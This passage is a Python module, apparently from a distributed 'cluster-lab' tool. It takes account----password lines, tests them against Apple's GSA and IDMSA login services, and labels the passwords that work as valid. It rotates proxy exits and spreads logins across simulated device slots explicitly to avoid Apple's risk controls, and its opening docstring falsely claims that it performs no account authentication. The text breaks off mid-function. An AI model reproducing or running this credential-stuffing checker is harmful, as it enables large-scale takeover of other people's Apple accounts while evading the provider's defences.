"""The only executor: offline line hashing, with optional synthetic delay.

No plugin loading, account authentication, shell commands or target URLs.
"""
from collections import deque
from concurrent.futures import ThreadPoolExecutor
import base64
import hashlib
import ipaddress
import json
import multiprocessing as mp
import os
from pathlib import Path
import queue
import re
import threading
import time
from urllib.parse import urlsplit

from .common import atomic_json


PROXY_ACQUIRE_WAIT_SECONDS = 5.0
PROXY_EMPTY_GRACE_SECONDS = 60.0
PROXY_RETRY_DELAY_SECONDS = 5.0
PROXY_REFILL_INTERVAL_SECONDS = 1.0
PROXY_WATERMARK_RATIO = 0.5
MIN_STALL_TIMEOUT_SECONDS = 180.0
PROXY_DEBUG_ENV = 'CLUSTER_PROXY_DEBUG'
PROXY_EXIT_IP_URL = 'https://api.ipify.org?format=json'
PROXY_EXIT_IP_TIMEOUT = 4.0
PROXY_EXIT_IP_MAX = 2048


class _WatermarkProxyPool:
    """Small task-local pool with fair reuse and one low-water refill path."""

    def __init__(self, fetch, target, low_water=None,
                 refill_interval=PROXY_REFILL_INTERVAL_SECONDS):
        self.fetch = fetch
        self.target = max(1, int(target))
        self.low_water = max(1, int(low_water or self.target * PROXY_WATERMARK_RATIO))
        self.condition = threading.Condition()
        self.fresh = deque()
        self.reusable = deque()
        self.known = set()
        self.leased = set()
        self.uses = {}
        self.refilling = False
        self.refill_interval = max(0.0, float(refill_interval))
        self.next_refill_at = 0.0

    def bootstrap(self):
        """Fetch the configured thread count once before workers start."""
        self._refill(blocking=True)
        return self.snapshot()

    def acquire(self, wait=PROXY_ACQUIRE_WAIT_SECONDS):
        deadline = time.monotonic() + max(0.0, float(wait))
        with self.condition:
            while True:
                endpoint = None
                if self.fresh:
                    endpoint = self.fresh.popleft()
                elif self.reusable:
                    # Do not let one fast thread repeatedly take the same
                    # endpoint while equally old exits are still busy.  A
                    # reusable exit is eligible when it is in the least-used
                    # generation; releases append at the tail for FIFO order.
                    least_uses = min(self.uses.get(value, 0)
                                     for value in self.known)
                    for _index in range(len(self.reusable)):
                        candidate = self.reusable.popleft()
                        if (endpoint is None
                                and self.uses.get(candidate, 0) <= least_uses):
                            endpoint = candidate
                        else:
                            self.reusable.append(candidate)
                if endpoint is not None:
                    self.leased.add(endpoint)
                    count = self.uses.get(endpoint, 0)
                    self.uses[endpoint] = count + 1
                    return (endpoint, 0.0, count)
                if len(self.known) < self.target and not self.refilling:
                    self._start_refill_locked()
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    return None
                self.condition.wait(min(0.1, remaining))

    def release(self, lease, healthy=True):
        endpoint = lease[0] if lease else None
        if not endpoint:
            return
        with self.condition:
            self.leased.discard(endpoint)
            if healthy and endpoint in self.known:
                # Old proxies rotate at the tail, so reuse stays even.
                self.reusable.append(endpoint)
            else:
                self.known.discard(endpoint)
                self.uses.pop(endpoint, None)
            self._ensure_watermark_locked()
            self.condition.notify_all()

    def discard(self, lease):
        self.release(lease, healthy=False)

    def snapshot(self):
        with self.condition:
            return {'target': self.target, 'low_water': self.low_water,
                    'fresh': len(self.fresh), 'reusable': len(self.reusable),
                    'available': len(self.fresh) + len(self.reusable),
                    'in_use': len(self.leased), 'known': len(self.known),
                    'refilling': self.refilling}

    def _ensure_watermark_locked(self):
        if len(self.known) < self.low_water and not self.refilling:
            self._start_refill_locked()

    def _start_refill_locked(self):
        self.refilling = True
        threading.Thread(target=self._refill, name='proxy-watermark-refill',
                         daemon=True).start()

    def _refill(self, blocking=False):
        if blocking:
            with self.condition:
                if self.refilling:
                    return
                self.refilling = True
        with self.condition:
            missing = max(0, self.target - len(self.known))
            delay = max(0.0, self.next_refill_at - time.monotonic())
        if delay:
            time.sleep(delay)
        try:
            values = list(self.fetch(missing) or ()) if missing else []
        except Exception:                                          # noqa: BLE001
            values = []
        with self.condition:
            self.next_refill_at = time.monotonic() + self.refill_interval
            # New endpoints always enter the fresh queue and are selected
            # before reusable ones. Identity is the complete provider string,
            # so equal IPs on different ports remain independent exits.
            for value in values:
                endpoint = str(value or '').strip()
                if endpoint and endpoint not in self.known:
                    self.known.add(endpoint)
                    self.fresh.append(endpoint)
            self.refilling = False
            self.condition.notify_all()


def stall_timeout_seconds(descriptor, minimum=MIN_STALL_TIMEOUT_SECONDS,
                          padding=60.0):
    """Return a no-progress budget larger than every configured retry."""
    timeout = max(0.1, float(descriptor.get('timeout') or 25))
    retries = descriptor.get('retries')
    attempts = max(0, int(2 if retries is None else retries)) + 1
    item_timeout = max(timeout, float(descriptor.get('item_timeout') or 40))
    return max(float(minimum), timeout * attempts + float(padding),
               item_timeout + float(padding))


def _slot_for_account(account, slot_ids):
    """Map one account to a stable, evenly distributed device slot."""
    slots = [int(value) for value in slot_ids]
    if not slots:
        raise ValueError('device slot list is empty')
    digest = hashlib.sha256(str(account or '').strip().casefold().encode('utf-8')).digest()
    prefix = base64.urlsafe_b64encode(digest).decode('ascii').rstrip('=')[:8]
    return slots[int.from_bytes(digest[:8], 'big') % len(slots)], 'B64:' + prefix


def _device_id_label(device_id):
    """Return the same short, non-secret device identifier used by the node UI."""
    raw = str(device_id or '').encode('utf-8')
    return ('B64:' + base64.urlsafe_b64encode(raw).decode('ascii').rstrip('=')[:8]
            if raw else '')


def _proxy_debug_enabled(descriptor=None):
    # A controller-supplied value is authoritative, including explicit False.
    # This lets the system setting turn logging off even when an older node
    # service still has CLUSTER_PROXY_DEBUG=1 in its environment.
    if descriptor is not None and '_proxy_debug' in descriptor:
        return bool(descriptor.get('_proxy_debug'))
    value = os.environ.get(PROXY_DEBUG_ENV, '')
    return str(value).strip().lower() in ('1', 'true', 'yes', 'on')


def _proxy_identity(value):
    """Return a credential-free endpoint identity for diagnostics."""
    if not value:
        return {'endpoint': '', 'host': '', 'port': None}
    try:
        parsed = urlsplit(str(value))
        host, port = (parsed.hostname or ''), parsed.port
    except (TypeError, ValueError):
        host, port = '', None
    endpoint = f'{host}:{port}' if host and port is not None else host
    return {'endpoint': endpoint[:160], 'host': host[:128], 'port': port}


def _proxy_pool_snapshot(pool):
    if pool is None:
        return {}
    try:
        return pool.snapshot()
    except Exception:                                               # noqa: BLE001
        return {}


def _proxy_debug_detail(value):
    text = str(value or '')
    text = re.sub(r'(?i)((?:https?|socks5h?)://)[^/@\s]+@', r'\1***@', text)
    text = re.sub(r'(?i)(password|passwd|pwd|token|key)=([^&\s]+)', r'\1=***', text)
    return text[:240]


def _apple_reason_for_record(result, status, debug=False):
    """Return Apple's raw message only for an explicitly debug-enabled job."""
    if not debug:
        return ''
    message = result.get('apple_message')
    if isinstance(message, str) and message.strip():
        return message.strip()[:2048]
    if status == 'need_2fa':
        auth_type = str(result.get('auth_type') or '').strip()
        if auth_type and auth_type != 'none':
            return f'au={auth_type[:80]}'
    return ''


def _repair_probe_method(web_result, trace):
    """Translate one supplemental IDMSA result without changing GSA truth.

    ``au=repair`` is an umbrella GSA continuation.  IDMSA's complete response
    is more specific, but only an explicit hsa/hsa2 challenge may be called a
    verification-code flow.  HTTP 412 / ``needs_setup`` remains a security or
    repair flow even when it carries an hsa-looking authType.
    """
    result = web_result if isinstance(web_result, dict) else {}
    metadata = trace.get('complete') if isinstance(trace, dict) else None
    metadata = metadata if isinstance(metadata, dict) else {}
    auth_type = str(metadata.get('auth_type') or '').strip().casefold()
    web_status = str(result.get('status') or '').strip().casefold()
    if web_status == 'need_2fa' and auth_type in ('hsa', 'hsa2'):
        return 'verification_code'
    if auth_type in ('sa', 'non-sa', 'dnu') or web_status == 'needs_setup':
        return 'security_repair'
    return 'repair_unspecified'


def _refine_repair_auth(result, email, password, proxy, timeout, cancel,
                        retries=0, checker=None):
    """Probe IDMSA once only after a verified GSA ``au=repair`` response.

    The GSA result remains authoritative.  A failed supplemental request never
    turns a password-verified account into an error or a retry outcome.
    """
    if (not isinstance(result, dict)
            or result.get('status') != 'need_2fa'
            or str(result.get('auth_type') or '').strip().casefold() != 'repair'):
        return result
    if checker is None:
        from fastcheck.protocols.idmsa import check as checker
    trace = {}

    def remember(event):
        if not isinstance(event, dict):
            return
        stage = str(event.get('stage') or '')
        if stage in ('init', 'complete'):
            metadata = {
                'http': event.get('http'),
                'auth_type': event.get('auth_type'),
                'attempt': event.get('attempt'),
                'server': str(event.get('server') or '')[:128],
                'via': str(event.get('via') or '')[:128],
                'retry_after': str(event.get('retry_after') or '')[:64],
                'content_type': str(event.get('content_type') or '')[:128],
                'response_body_bytes': event.get('response_body_bytes'),
                'response_body_sha256': str(event.get('response_body_sha256') or '')[:64],
                'response_keys': list(event.get('response_keys') or [])[:32],
                'service_error_codes': list(event.get('service_error_codes') or [])[:16],
                'has_session_headers': bool(event.get('has_session_headers')),
                'has_set_cookie': bool(event.get('has_set_cookie')),
            }
            trace[stage] = metadata
            trace['latest'] = metadata

    try:
        web_result = checker(email, password, proxy, timeout=timeout,
                             retries=max(0, int(retries or 0)),
                             cancel=cancel, trace=remember)
    except Exception as exc:                                      # noqa: BLE001
        # Persist only the exception class.  Exception messages from HTTP
        # libraries may contain proxy URLs (and therefore credentials).
        web_result = {'status': 'error', 'kind': type(exc).__name__,
                      'detail': type(exc).__name__}
    web_result = web_result if isinstance(web_result, dict) else {}
    latest = (trace.get('latest') if isinstance(trace.get('latest'), dict)
              else trace.get('complete') if isinstance(trace.get('complete'), dict)
              else trace.get('init') if isinstance(trace.get('init'), dict)
              else {})
    complete = trace.get('complete') if isinstance(trace.get('complete'), dict) else {}
    enriched = dict(result)
    enriched.update(
        two_factor_method=_repair_probe_method(web_result, trace),
        web_auth_type=str(complete.get('auth_type') or '')[:32],
        web_http=latest.get('http'),
        web_status=str(web_result.get('status') or '')[:32],
        web_stage=str(web_result.get('stage') or
                      ('complete' if complete else 'init' if latest else ''))[:32],
        web_kind=str(web_result.get('kind') or '')[:64],
        web_detail=str(web_result.get('detail') or '')[:256],
        web_attempts=max(0, int(latest.get('attempt') or 0)),
        web_server=latest.get('server') or '',
        web_via=latest.get('via') or '',
        web_retry_after=latest.get('retry_after') or '',
        web_content_type=latest.get('content_type') or '',
        web_response_bytes=latest.get('response_body_bytes'),
        web_response_sha256=latest.get('response_body_sha256') or '',
        web_response_keys=(latest.get('response_keys') or []) if latest else None,
        web_service_error_codes=(latest.get('service_error_codes') or []) if latest else None,
        web_has_session_headers=bool(latest.get('has_session_headers')) if latest else None,
        web_has_set_cookie=bool(latest.get('has_set_cookie')) if latest else None,
    )
    # Web sa/non-sa proves the password and belongs in the password-correct
    # bucket even when GSA used its broad au=repair continuation.
    if (str(complete.get('auth_type') or '').strip().casefold() in ('sa', 'non-sa')
            and str(web_result.get('status') or '').strip().casefold()
            in ('valid', 'needs_setup')):
        enriched['status'] = 'valid'
    return enriched


def _refine_repair_auth_with_rotation(result, email, password, proxy, timeout,
                                      cancel, retries, rotate_proxy,
                                      checker=None):
    """Retry transient Web HTTP 0/5xx checks on newly acquired exits.

    GSA is deliberately not repeated because its ``au=repair`` result is
    already authoritative; only the supplemental Web request is retried.
    """
    current_proxy = proxy
    refined = result
    attempts = 0
    rotations = 0
    exhausted = False
    limit = max(0, int(retries or 0)) + 1
    for attempt in range(limit):
        attempts += 1
        refined = _refine_repair_auth(
            result, email, password, current_proxy, timeout, cancel,
            retries=0, checker=checker)
        try:
            web_http = int(refined.get('web_http'))
        except (TypeError, ValueError):
            web_http = None
        transient = (str(refined.get('web_status') or '').casefold() == 'error'
                     and web_http in (0, 500, 502, 503, 504))
        if not transient or attempt + 1 >= limit or (cancel and cancel()):
            break
        current_proxy, available = rotate_proxy(attempt + 1)
        if not available:
            exhausted = True
            break
        rotations += 1
    if isinstance(refined, dict) and refined is not result:
        refined['web_attempts'] = attempts
        refined['web_proxy_rotations'] = rotations
        if exhausted:
            refined['web_rotation_exhausted'] = True
    return refined


def _write_proxy_debug(path, event, **fields):
    """Append one bounded JSONL event without ever persisting proxy credentials."""
    if not path:
        return
    payload = {'at': round(time.time(), 6), 'event': str(event),
               'pid': os.getpid(), 'thread': threading.current_thread().name}
    payload.update(fields)
    raw = (json.dumps(payload, ensure_ascii=False, separators=(',', ':'),
                      default=str) + '\n').encode('utf-8')
    # One O_APPEND write keeps concurrent worker lines intact.  Truncate large
    # exception details before this helper so a single event remains bounded.
    fd = os.open(str(path), os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
    try:
        os.write(fd, raw)
    finally:
        os.close(fd)


def _probe_proxy_exit_ip(proxy, timeout=PROXY_EXIT_IP_TIMEOUT, url=None):
    """Return the public exit IP observed through one proxy endpoint."""
    import requests

    value = str(proxy or '')
    if not value:
        raise ValueError('missing proxy endpoint')
    response = requests.get(
        url or os.environ.get('CLUSTER_PROXY_DEBUG_IP_URL') or PROXY_EXIT_IP_URL,
        proxies={'http': value, 'https': value},
        timeout=max(0.5, float(timeout)), allow_redirects=False,
        headers={'User-Agent': 'clusterlab-proxy-debug/1'},
    )
    response.raise_for_status()
    try:
        payload = response.json()
    except ValueError:
        candidate = response.text.strip()
    else:
        candidate = str(payload.get('ip') or '').strip() if isinstance(payload, dict) else ''
    if not candidate:
        raise ValueError('exit IP response is empty')
    return str(ipaddress.ip_address(candidate))


class _ProxyExitIpDebug:
    """Bounded asynchronous exit-IP sampler used only by debug-mode workers."""

    def __init__(self, path, probe=None, limit=None, workers=4):
        configured = os.environ.get('CLUSTER_PROXY_DEBUG_IP_MAX')
        try:
            requested = int(configured if limit is None and configured else
                            (PROXY_EXIT_IP_MAX if limit is None else limit))
        except (TypeError, ValueError):
            requested = PROXY_EXIT_IP_MAX
        self.path = path
        self.limit = max(1, min(10000, requested))
        self.probe = probe or _probe_proxy_exit_ip
        self.queue = queue.Queue(maxsize=self.limit)
        self.lock = threading.Lock()
        self.seen = set()
        self.attempt_results = {}
        self.switches = set()
        self.submitted = 0
        self.completed = 0
        self.errors = 0
        self.skipped = 0
        self.closed = False
        self.threads = []
        for index in range(max(1, min(4, int(workers or 1)))):
            thread = threading.Thread(target=self._run,
                                      name=f'proxy-exit-ip-{index}', daemon=True)
            thread.start()
            self.threads.append(thread)

    def submit(self, proxy, trigger, **fields):
        identity = _proxy_identity(proxy)
        endpoint = identity['endpoint']
        if not endpoint:
            return False
        sample_key = (endpoint, str(trigger), fields.get('row'),
                      fields.get('slot'), fields.get('attempt'))
        with self.lock:
            if self.closed or sample_key in self.seen:
                return False
            if len(self.seen) >= self.limit:
                self.skipped += 1
                return False
            self.seen.add(sample_key)
            self.submitted += 1
        item = (str(proxy), identity, {'trigger': str(trigger), **fields})
        try:
            self.queue.put_nowait(item)
        except queue.Full:
            with self.lock:
                self.skipped += 1
            _write_proxy_debug(self.path, 'exit_ip_probe_skipped',
                               endpoint=identity['endpoint'], host=identity['host'],
                               port=identity['port'], reason='queue_full')
            return False
        return True

    def _run(self):
        while True:
            item = self.queue.get()
            try:
                if item is None:
                    return
                proxy, identity, fields = item
                started = time.monotonic()
                try:
                    exit_ip = self.probe(proxy)
                    elapsed = round((time.monotonic() - started) * 1000, 2)
                    _write_proxy_debug(
                        self.path, 'exit_ip_probe', probe_status='ok',
                        exit_ip=exit_ip, probe_ms=elapsed,
                        endpoint=identity['endpoint'], host=identity['host'],
                        port=identity['port'], **fields)
                    self._record_attempt(identity, fields, 'ok', exit_ip)
                    with self.lock:
                        self.completed += 1
                except Exception as exc:                          # noqa: BLE001
                    elapsed = round((time.monotonic() - started) * 1000, 2)
                    _write_proxy_debug(
                        self.path, 'exit_ip_probe', probe_status='error',
                        exit_ip='', probe_ms=elapsed,
                        endpoint=identity['endpoint'], host=identity['host'],
                        port=identity['port'], error_type=type(exc).__name__,
                        detail=_proxy_debug_detail(exc), **fields)
                    self._record_attempt(identity, fields, 'error', '')
                    with self.lock:
                        self.errors += 1
            finally:
                self.queue.task_done()

    def _record_attempt(self, identity, fields, status, exit_ip):
        row, slot, attempt = (fields.get('row'), fields.get('slot'),
                              fields.get('attempt'))
        if row is None or slot is None or attempt is None:
            return
        key = (row, slot, int(attempt))
        current = {'endpoint': identity['endpoint'], 'host': identity['host'],
                   'port': identity['port'], 'exit_ip': exit_ip,
                   'probe_status': status}
        pairs = []
        with self.lock:
            self.attempt_results[key] = current
            for left_attempt in (int(attempt) - 1, int(attempt)):
                if left_attempt < 0:
                    continue
                pair_key = (row, slot, left_attempt, left_attempt + 1)
                left = self.attempt_results.get((row, slot, left_attempt))
                right = self.attempt_results.get((row, slot, left_attempt + 1))
                if left is None or right is None or pair_key in self.switches:
                    continue
                self.switches.add(pair_key)
                pairs.append((left_attempt, left, right))
        for left_attempt, left, right in pairs:
            verified = (left['probe_status'] == 'ok' and
                        right['probe_status'] == 'ok')
            _write_proxy_debug(
                self.path, 'exit_ip_switch', row=row, slot=slot,
                from_attempt=left_attempt, to_attempt=left_attempt + 1,
                previous_endpoint=left['endpoint'], endpoint=right['endpoint'],
                previous_exit_ip=left['exit_ip'], exit_ip=right['exit_ip'],
                previous_probe_status=left['probe_status'],
                probe_status=right['probe_status'], verified=verified,
                gateway_changed=left['endpoint'] != right['endpoint'],
                port_changed=left['port'] != right['port'],
                exit_ip_changed=(left['exit_ip'] != right['exit_ip']
                                 if verified else None))

    def snapshot(self):
        with self.lock:
            return {'limit': self.limit, 'submitted': self.submitted,
                    'completed': self.completed, 'errors': self.errors,
                    'skipped': self.skipped, 'pending': self.queue.unfinished_tasks}

    def close(self, timeout=10.0):
        with self.lock:
            self.closed = True
        deadline = time.monotonic() + max(0.0, float(timeout))
        while self.queue.unfinished_tasks and time.monotonic() < deadline:
            time.sleep(0.02)
        for _thread in self.threads:
            try:
                self.queue.put_nowait(None)
            except queue.Full:
                break
        for thread in self.threads:
            thread.join(max(0.0, deadline - time.monotonic()))


def execute_unit(directory, descriptor, stop):
    directory = Path(directory)
    started = time.time()
    processed = 0
    output_path = directory / 'results.jsonl'
    output_digest = hashlib.sha256()

    def transform(item):
        row, line = item
        raw = line.rstrip(b'\r\n')
        if descriptor['mode'] == 'simulate':
            # The override is used by the local soak verifier to keep a large
            # test running long enough to observe dispatch and 1 Hz reports.
            delay = float(os.environ.get('CLUSTER_LAB_SIMULATE_DELAY', '0.004'))
            time.sleep(max(0.0, min(delay, 10.0)))
        # account 保留原始记录，供总控逐行核对；status 是分类结果。
        # 离线摘要没有业务判定，统一记为 valid，接入真实执行器后由执行器给值。
        record = {'row': row, 'account': raw.decode('utf-8', 'replace')[:512],
                  'status': 'valid', 'sha256': hashlib.sha256(raw).hexdigest(), 'bytes': len(raw)}
        return (json.dumps(record, separators=(',', ':')) + '\n').encode()

    try:
        with (directory / 'input.part').open('rb') as source, output_path.open('wb') as output:
            output_path.chmod(0o600)
            with ThreadPoolExecutor(max_workers=descriptor['threads']) as pool:
                pending = deque()
                next_row = descriptor['first_row']
                exhausted = False
                last_progress = 0
                while not exhausted or pending:
                    if stop.is_set():
                        raise InterruptedError('租约失效或节点关闭')
                    while not exhausted and len(pending) < descriptor['threads'] * 2:
                        line = source.readline(65537)
                        if not line:
                            exhausted = True
                            break
                        if len(line) > 65536:
                            raise ValueError('输入记录过长')
                        pending.append(pool.submit(transform, (next_row, line)))
                        next_row += 1
                    if pending:
                        result = pending.popleft().result()
                        output.write(result)
                        output_digest.update(result)
                        processed += 1
                    if time.monotonic() - last_progress > 0.25:
                        # Make complete JSONL lines visible to the node agent.
                        # Only the node heartbeat reports them; worker processes
                        # never contact the controller directly.
                        output.flush()
                        atomic_json(directory / 'progress.json',
                                    {'processed': processed, 'started': started,
                                     'counts': {'valid': processed}})
                        last_progress = time.monotonic()
            output.flush()
        if processed != descriptor['rows']:
            raise ValueError('输入条数和工作包描述不一致')
        atomic_json(directory / 'progress.json',
                    {'processed': processed, 'started': started,
                     'counts': {'valid': processed}})
        atomic_json(directory / 'done.json', {'ok': True, 'processed': processed,
                    'counts': {'valid': processed},
                    'checksum': output_digest.hexdigest(), 'elapsed': time.time() - started})
    except Exception as exc:
        atomic_json(directory / 'progress.json',
                    {'processed': processed, 'started': started,
                     'counts': {'valid': processed}})
        atomic_json(directory / 'done.json', {'ok': False, 'processed': processed, 'error': type(exc).__name__})


def _group_child(directory, descriptor, stop, proxy_pool=None):
    # 认证子进程属于吞吐型后台工作。降低它相对节点主进程的调度优先级，
    # 避免 SRP/PBKDF2/TLS 高负载时心跳线程拿不到 CPU 而误丢租约。
    worker_nice = 0
    if mp.parent_process() is not None:
        try:
            worker_nice = os.nice(5)
        except (AttributeError, OSError):
            worker_nice = 0
    descriptor['_worker_nice'] = worker_nice
    runner = execute_auth_unit if descriptor.get('mode') == 'auth' else execute_unit
    if runner is execute_auth_unit:
        runner(directory, descriptor, stop, proxy_pool=proxy_pool)
    else:
        runner(directory, descriptor, stop)


def execute_unit_group(directory, descriptor, stop):
    """Run one package in one worker process with the configured thread count."""
    directory = Path(directory)
    descriptor = dict(descriptor)
    configured_processes = max(1, int(descriptor.get('processes') or 1))
    threads = max(1, int(descriptor.get('threads') or 1))
    descriptor['processes'] = 1
    descriptor['_node_process_count'] = 1
    descriptor['_node_configured_process_count'] = 1
    descriptor['_node_cpu_count'] = max(1, int(os.cpu_count() or 1))
    descriptor['_active_threads_per_process'] = threads
    debug_path = None
    if _proxy_debug_enabled(descriptor):
        debug_path = directory / 'proxy-debug.jsonl'
        descriptor['_proxy_debug'] = True
        descriptor['_proxy_debug_path'] = str(debug_path)
        _write_proxy_debug(
            debug_path, 'debug_start', job_id=str(descriptor.get('job_id') or ''),
            unit_id=str(descriptor.get('id') or ''),
            rows=int(descriptor.get('rows') or 0), processes=1, threads=threads,
            requested_processes=configured_processes,
            retries=int(2 if descriptor.get('retries') is None
                        else descriptor.get('retries')),
            timeout=float(descriptor.get('timeout') or 25),
            item_timeout=float(descriptor.get('item_timeout') or 40),
            mode='single_process_watermark', credentials_recorded=False)

    _group_child(directory, descriptor, stop)
    progress = {}
    try:
        progress = json.loads((directory / 'progress.json').read_text('utf-8'))
    except (OSError, ValueError):
        pass
    progress.update(workers=0, worker_limit=1, configured_process_limit=1,
                    active_process_limit=1, threads_per_process=threads,
                    active_threads_per_process=threads)
    atomic_json(directory / 'progress.json', progress)
    try:
        done = json.loads((directory / 'done.json').read_text('utf-8'))
    except (OSError, ValueError):
        done = {'ok': False, 'processed': int(progress.get('processed') or 0),
                'error': 'worker_result_missing'}
    done.update(workers=1, configured_process_limit=1,
                active_threads_per_process=threads)
    atomic_json(directory / 'done.json', done)


def _load_fastcheck():
    """cluster-lab 与 fastcheck 在同一仓库的兄弟目录，运行时按需挂载。"""
    import sys
    from pathlib import Path
    # cluster-lab 目录下的 fastcheck 软链接优先：父目录通常只有 x 权限，
    # Python 的 FileFinder 要用 os.listdir 才能发现包，会 ImportError。
    here = Path(__file__).resolve().parents[1]
    candidates = [here, Path(__file__).resolve().parents[2]]
    root = next((path for path in candidates if (path / 'fastcheck').exists()), candidates[-1])
    if str(root) not in sys.path:
        sys.path.insert(0, str(root))
    try:
        from fastcheck.devices import DevicePool
    except ModuleNotFoundError as exc:
        if (root / 'fastcheck').exists():
            raise RuntimeError(
                f'无法导入 fastcheck（{root / "fastcheck"} 存在但不可读或缺少依赖）：{exc}') from exc
        raise RuntimeError(f'找不到 fastcheck 目录：{root / "fastcheck"}') from exc
    from fastcheck.protocols.gsa_status import check as gsa_check
    from fastcheck.status import result_bucket
    return DevicePool, gsa_check, result_bucket


def _split_account(line):
    """输入行形如 账号----密码；没有分隔符时整行当账号、密码留空。"""
    for separator in ('----', '\t', ':'):
        if separator in line:
            account, _, password = line.partition(separator)
            return account.strip(), password.strip()
    return line.strip(), ''


def _usage_snapshot(device_root):
    if not device_root:
        return {}
    try:
        value = json.loads((Path(device_root) / 'usage.json').read_text('utf-8'))
        return {int(slot): max(0, int(count)) for slot, count in value.items()}
    except (OSError, ValueError, TypeError, AttributeError):
        return {}


def _bump_usage(device_root, counts, resets=()):
    """每个工作包合并写一次设备计数，并用进程锁防止覆盖。"""
    if not device_root or (not counts and not resets):
        return
    import portalocker
    path = Path(device_root) / 'usage.json'
    path.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
    lock = path.with_suffix('.lock')
    try:
        with portalocker.Lock(str(lock), mode='a+', timeout=10):
            try:
                data = json.loads(path.read_text('utf-8')) if path.exists() else {}
            except (OSError, ValueError):
                data = {}
            for slot in resets:
                data[str(int(slot))] = 0
            for slot, count in counts.items():
                key = str(int(slot))
                data[key] = int(data.get(key) or 0) + int(count)
            atomic_json(path, data)
    except (OSError, portalocker.exceptions.LockException):
        pass


def record_device_registration(device_root, slot, proxy, model=''):
    """Persist the first registration facts for the current slot generation."""
    if not device_root:
        return False
    directory = Path(device_root) / 'registrations'
    path = directory / f'{int(slot):03d}.json'
    try:
        directory.mkdir(mode=0o700, parents=True, exist_ok=True)
        descriptor = os.open(path, os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600)
        value = {'slot': int(slot), 'proxy': str(proxy or ''), 'model': str(model or ''),
                 'at': time.strftime('%Y-%m-%d %H:%M:%S'), 'ts': time.time()}
        with os.fdopen(descriptor, 'w', encoding='utf-8') as handle:
            json.dump(value, handle, ensure_ascii=False, separators=(',', ':'))
        return True
    except FileExistsError:
        return False
    except (OSError, TypeError, ValueError):
        return False


def execute_auth_unit(directory, descriptor, stop, proxy_pool=None):
    """真实认证执行入口：任何异常都落成 done.json，避免节点只看到"进程退出"。"""
    try:
        _execute_auth_unit(directory, descriptor, stop, proxy_pool=proxy_pool)
    except Exception as exc:                                       # noqa: BLE001
        atomic_json(Path(directory) / 'done.json',
                    {'ok': False, 'processed': 0,
                     'error': f'{type(exc).__name__}: {exc}'[:300]})


def _execute_auth_unit(directory, descriptor, stop, proxy_pool=None):
    from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait
    from collections import Counter
    import heapq
    import sys

    directory = Path(directory)
    started = time.time()
    output_path = directory / 'results.jsonl'
    DevicePool, gsa_check, result_bucket = _load_fastcheck()
    proxy = descriptor.get('proxy')
    fetch_proxy_batch = None
    if descriptor.get('proxy_api') and proxy_pool is None:
        from fastcheck.proxy_pool import fetch_proxies
        scheme = descriptor.get('proxy_scheme') or 'socks5h'

        def fetch_proxy_batch(count):
            return fetch_proxies(
                descriptor['proxy_api'], count,
                scheme=None if scheme == 'http' else scheme)

    elif not proxy:
        proxy = None
    origin = descriptor.get('origin') or 'https://new.ani.sidestore.io'
    device_root = descriptor.get('device_root')
    capacity = int(descriptor.get('device_pool_capacity') or
                   descriptor.get('device_capacity') or 8)
    configured_slots = descriptor.get('device_slots')
    if isinstance(configured_slots, list) and configured_slots:
        slot_ids = [max(1, min(capacity, int(value))) for value in configured_slots]
    else:
        slot_ids = list(range(1, capacity + 1))
    timeout = float(descriptor.get('timeout') or 25)
    retry_value = descriptor.get('retries')
    retries = max(0, int(2 if retry_value is None else retry_value))
    item_timeout = max(timeout, float(descriptor.get('item_timeout') or 40))
    public_header_use_limit = max(1, int(descriptor.get('public_header_use_limit') or 15))
    device_use_limit = max(1, int(descriptor.get('device_use_limit') or 1000))
    retry_delay = max(0.0, float(descriptor.get('_retry_delay',
                                                PROXY_RETRY_DELAY_SECONDS)))
    configured_workers = max(1, int(descriptor.get('threads') or 1))
    workers = max(1, int(descriptor.get('_active_threads_per_process') or
                         configured_workers))
    header_gate = threading.Semaphore(min(100, workers))
    runtime_proxy_pool = fetch_proxy_batch is not None
    if runtime_proxy_pool:
        proxy_pool = _WatermarkProxyPool(fetch_proxy_batch, target=workers)
        proxy_pool.bootstrap()
    debug_enabled = _proxy_debug_enabled(descriptor)
    debug_path = (descriptor.get('_proxy_debug_path') or
                  str(directory / 'proxy-debug.jsonl')) if debug_enabled else None
    exit_ip_debug = _ProxyExitIpDebug(debug_path) if debug_enabled else None
    counters = Counter()
    processed = 0
    last_progress = time.monotonic()

    try:
        pool = DevicePool(device_root, origin, max_devices=capacity, in_memory=True)
    except TypeError:
        # Older test doubles retain the original constructor.
        pool = DevicePool(device_root, origin, max_devices=capacity)
    from fastcheck.workers import device_profile
    if debug_enabled:
        _write_proxy_debug(debug_path, 'worker_start',
                           rows=int(descriptor.get('rows') or 0),
                           first_row=int(descriptor.get('first_row') or 1),
                           threads=workers, configured_threads=configured_workers,
                           worker_nice=int(descriptor.get('_worker_nice') or 0),
                           retries=retries, timeout=timeout,
                           item_timeout=item_timeout,
                           slots=slot_ids, credentials_recorded=False)

    # 一个包内把账号摊到所有设备上：一台设备只承担 rows/capacity 条，
    # 比固定用 1 号设备更分散，明显降低单设备被风控的概率。
    identities, infos, device_labels = {}, {}, {}
    # Compatibility only: an explicitly injected legacy pool keeps the old
    # bootstrap path. Production execute_unit_group never creates such a pool.
    for index in slot_ids if proxy_pool is not None and not runtime_proxy_pool else ():
        bootstrap_before = _proxy_pool_snapshot(proxy_pool) if debug_enabled else {}
        bootstrap_started = time.monotonic() if debug_enabled else None
        bootstrap_lease = proxy_pool.acquire(wait=2.0) if proxy_pool is not None else None
        bootstrap_proxy = bootstrap_lease[0] if bootstrap_lease is not None else proxy
        bootstrap_identity = (_proxy_identity(bootstrap_proxy) if debug_enabled else
                              {'endpoint': '', 'host': '', 'port': None})
        if debug_enabled and proxy_pool is not None and bootstrap_lease is None:
            _write_proxy_debug(
                debug_path, 'bootstrap_pool_empty', slot=index,
                wait_ms=round((time.monotonic() - bootstrap_started) * 1000, 2),
                pool_before=bootstrap_before, pool_after=_proxy_pool_snapshot(proxy_pool))
        if descriptor.get('proxy_api') and not bootstrap_proxy:
            infos[index] = None
            identities[index] = None
            continue
        try:
            profile = device_profile(pool, index)
            infos[index] = {'client_info': profile['client_info'],
                            'user_agent': profile['user_agent']}
            inspected = pool.inspect(index)
            ready = inspected['state'] == 'ready'
            device_labels[index] = _device_id_label(inspected.get('device_id'))
            with header_gate:
